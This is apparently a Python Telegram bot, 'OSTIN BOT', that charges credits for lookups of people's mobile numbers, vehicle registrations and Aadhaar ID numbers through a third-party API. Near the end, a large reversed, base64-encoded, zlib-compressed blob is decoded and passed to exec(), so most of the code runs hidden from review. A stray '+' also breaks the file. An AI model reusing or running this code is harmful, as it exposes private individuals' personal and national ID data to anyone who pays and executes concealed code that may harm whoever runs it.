import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
import requests
import time
from datetime import datetime
import threading
import os
import json

# ===== BANNER =====
banner = """
\033[1;31m
 ██████╗  ███████╗████████╗██╗███╗   ██╗
██╔═══██╗ ██╔════╝╚══██╔══╝██║████╗  ██║
██║   ██║ ███████╗   ██║   ██║██╔██╗ ██║
██║   ██║ ╚════██║   ██║   ██║██║╚██╗██║
╚██████╔╝ ███████║   ██║   ██║██║ ╚████║
 ╚═════╝  ╚══════╝   ╚═╝   ╚═╝╚═╝  ╚═══╝

        >>> OSTIN BOT <<<
      DEVELOPER BY DIGITAL CYBER [ARYAN AFRIDI]
\033[0m
"""
print(banner)

# ===== CONFIG =====
BOT_TOKEN = "12345678"
ADMIN_ID = 12345678
DEVELOPER_USERNAME = "@testing"
YOUTUBE_CHANNEL = "https://www.youtube.com/@aryanafridi00"
UPI_ID = "digitalcyber780@okhdfcbank"
DEFAULT_CREDITS = 10 
DEFAULT_START_CREDITS = 10

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# ===== API URLS =====
NUMBER_API_URL = "https://users-xinfo-admin.vercel.app/api?key=7daysfree&type=mobile&term={}"
VEHICLE_API_URL = "https://users-xinfo-admin.vercel.app/api?key=7daysfree&type=vehicle&term={}"
AADHAAR_API_URL = "https://users-xinfo-admin.vercel.app/api?key=7daysfree&type=aadhar&term={}"

# ===== DATABASE =====
db_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "users.db")
conn = sqlite3.connect(db_path, check_same_thread=False)

def init_db():
    with conn:
        conn.execute("CREATE TABLE IF NOT EXISTS users(user_id INTEGER PRIMARY KEY, credits INTEGER DEFAULT 0, join_date TEXT)")
        conn.execute("CREATE TABLE IF NOT EXISTS redeem_codes(code TEXT PRIMARY KEY, credits INTEGER, used INTEGER DEFAULT 0)")
        conn.execute("CREATE TABLE IF NOT EXISTS transactions(user_id INTEGER, amount INTEGER, type TEXT, date TEXT)")
        conn.execute("CREATE TABLE IF NOT EXISTS user_sessions(user_id INTEGER PRIMARY KEY, message_id INTEGER, service TEXT, timestamp TEXT)")
init_db()

+
@bot.callback_query_handler(func=lambda c: c.data == "main_menu")
def back_to_main(call):
    clear_user_session(call.from_user.id)
    balance = get_credits(call.message.chat.id)
    text = f"""🏠 <b>CONTROL PANEL</b>

⚡ <code>Power Level: {balance} Units</code>
🔧 <code>Technician: {DEVELOPER_USERNAME}</code>
🔴 <code>Intel Source: YouTube</code>"""
    try:
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=main_menu(call.from_user.id))
    except:
        bot.send_message(call.message.chat.id, text, reply_markup=main_menu(call.from_user.id))

@bot.callback_query_handler(func=lambda c: c.data == "show_balance")
def show_balance(call):
    balance = get_credits(call.from_user.id)
    try:
        bot.answer_callback_query(call.id, f"⚡ Power Units: {balance}", show_alert=True)
    except:
        pass

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
exec((_)(b'=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'))